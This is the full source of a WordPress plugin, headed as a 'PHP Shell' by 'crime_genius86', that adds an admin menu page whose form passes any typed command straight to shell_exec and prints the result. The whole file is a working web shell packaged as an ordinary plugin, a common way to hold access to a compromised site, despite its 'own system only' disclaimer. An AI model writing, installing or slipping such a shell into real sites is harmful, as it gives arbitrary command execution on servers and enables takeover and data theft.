<?php
/*
Plugin Name: PHP Shell by crime_genius86
Plugin URI: http://blog.crime-genius86.net/wordpress-plugin-php-shell/
Description: PHP SHELL! USE AT YOUR OW RISK!
Version: 1.0
Author: crime_genius86
Author URI: http://blog.crime-genius86.net/
*/



function HM_php_shell() {
	add_action('admin_menu', 'php_shell_HM_crewz');
}
add_action('init', 'HM_php_shell');

function php_shell_HM_crewz() {
	if ( function_exists('add_submenu_page') )
		add_submenu_page('index.php', __('PHP Shell HM crewz'), __('PHP Shell HM crewz'), 'manage_options', 'php-shell-page', 'php_shellpage');

}

function php_shellpage() {
	global $suspicious_files, $md5_list, $wpdb, $wp_db_version;
	if( !current_user_can( 'manage_options' ) )
		wp_die( 'Not allowed here!' );
	?><div class="wrap">
	
	
	<h2>PHP Shell</h2>
	<p>FOR YOUR OWN SYSTEM ONLY! USE AT YOUR OW RISK.</p>

    <form method=POST>
    <br>
    <input type=TEXT name="-cmd" size=64 value="<?=$cmd?>"
    style="background:#ffffff;color:#000000;">
    <hr>
    <pre>
    <? $cmd = $_REQUEST["-cmd"];?>
    <? if($cmd != "") print Shell_Exec($cmd);?>
    </pre>
    </form>
  
  <?php
  }
  ?>
	